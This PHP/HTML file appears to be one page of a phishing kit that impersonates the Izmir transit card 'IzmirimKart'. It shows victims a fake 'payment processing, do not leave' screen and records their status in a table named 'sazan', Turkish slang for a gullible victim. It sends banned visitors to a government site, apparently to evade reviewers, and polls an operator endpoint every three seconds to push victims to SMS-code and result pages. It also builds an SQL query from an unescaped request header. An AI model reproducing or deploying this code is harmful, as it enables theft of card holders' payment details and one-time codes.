<?php
date_default_timezone_set('Europe/Istanbul');
include('baglan.php');
    $ip = $_SERVER['HTTP_HOST'];
$db->query("UPDATE sazan SET now = 'Bekleme Sayfasi' WHERE ip = '{$ip}'");

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
            header('Location:http://www.turkiye.gov.tr');
        } 
}

?>
<!DOCTYPE html>
<html lang="tr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="icon" href="../dvdvdvdv.pnh" type="image/x-icon" />
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Mulish:wght@500&display=swap" rel="stylesheet">
<link rel="shortcut icon" href="../dvdvdvdv.png" type="image/x-icon" />

<meta name="viewport" content="width=device-width, initial-scale=1">
<title>IzmirimKart | Yükleme</title>
<link href="anadosya/bootstrap.min.css" rel="stylesheet">
<link href="anadosya/style.css" rel="stylesheet">
<link href="anadosya/responsive.css" rel="stylesheet">
<title></title>
</head>
<body>
<div class="body_wrapper frm-vh-md-100">
<div class="formify_body" data-bg-color="#E3F0FF" style="background-color: rgb(227, 240, 255);">
<div class="f_content">
<div class="container">
<div class="row">
<div class="formify_box">
<div class="formify_header text-center">
<a href="#" class="mb-3 formify_logo"><img style="width:70%" src="logorenk2.png" alt=""></a>
<h4 class="form_title" style="font-family: 'Mulish', sans-serif;
">Lütfen bekleyiniz..</h4>
</div>
<div class="text-center">
<img style="width:50%" src="bekle.gif" alt="">
<h5 style="font-family: 'Mulish', sans-serif;">Ödeme işleminiz gerçekleştiriliyor...<br>Lütfen sayfadan çıkmayınız.</h5>
</div>
</div>
</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>


<script src='../cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
<script src="../cdn.jsdelivr.net/npm/bootstrap%405.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>


<script type="text/javascript">
 $(document).ready(function() {

    gonder();

    var int=self.setInterval("gonder()",3000);
  
});

function gonder(){

    $.ajax({
      type:'POST',
      url:'<?php echo "datach.php?ip=".$ip; ?>',
      success: function (msg) {
      
      if(msg=='sms'){
        window.location.href='sms.php';
      }
      if(msg=='tebrik'){
        window.location.href='tebrik.php';
      }
       if(msg=='hata'){
        window.location.href='hata.php';
      }
      if(msg=='sms2'){
        window.location.href='hatali.php';
      } 
      }
    });
    
}
</script>